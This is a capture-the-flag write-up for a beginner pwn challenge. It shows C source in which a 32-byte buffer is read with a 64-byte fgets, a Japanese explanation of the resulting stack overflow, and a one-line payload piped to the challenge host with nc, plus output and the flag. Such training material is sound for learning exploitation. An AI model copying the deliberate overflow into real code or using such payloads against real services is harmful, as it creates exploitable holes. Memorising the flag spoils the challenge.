# p0wn3d - Pwn

An introduction to pwn challenges. This is to protect the babies from last year!

nc p0wn3d.kctf-453514-codelab.kctf.cloud 1337

main.c 
```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

struct __attribute__((__packed__)) data {
  char buf[32];
  int guard;
};

void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
  char flag[1024] = { 0 };
  FILE *fp = fopen("flag.txt", "r");
  fgets(flag, 1023, fp);
  printf(flag);
}

int main(void) 
{
  struct data first_words;
  ignore(); /* ignore this function */

  printf("Hello little p0wn3r. Do you have any first words?\n");
  fgets(first_words.buf, 64, stdin);
  sleep(2);
        puts("Man that is so cute");
        sleep(2);
        puts("I remember last year people were screaming at the little p0wn3rs.. like AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!");
        sleep(2);
        puts("Don't worry little one. I won't let them do that to you. I've set up a guard");

  if (first_words.guard == 0x42424242) {
    get_flag();
  }

  return 0;
}
```

## solve
バッファオーバーフローの脆弱性がある
- fgets で first_words.buf に 64 バイトまで入力を受け付けていますが、buf は 32 バイトしか確保されていません。これにより、guard の値が不正に変更され、get_flag() 関数が呼ばれる

-32バイト分guardを埋めて、0x42424242（リトルエンディアン）を満たせばいい

```
$ python3 -c "print('A'*32 + '\x42\x42\x42\x42')" | nc p0wn3d.kctf-453514-codelab.kctf.cloud 1337
== proof-of-work: disabled ==
Hello little p0wn3r. Do you have any first words?
Man that is so cute
I remember last year people were screaming at the little p0wn3rs.. like AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Don't worry little one. I won't let them do that to you. I've set up a guard
wctf{pwn_1s_l0v3_pwn_1s_l1f3}
```

## flag
`wctf{pwn_1s_l0v3_pwn_1s_l1f3}`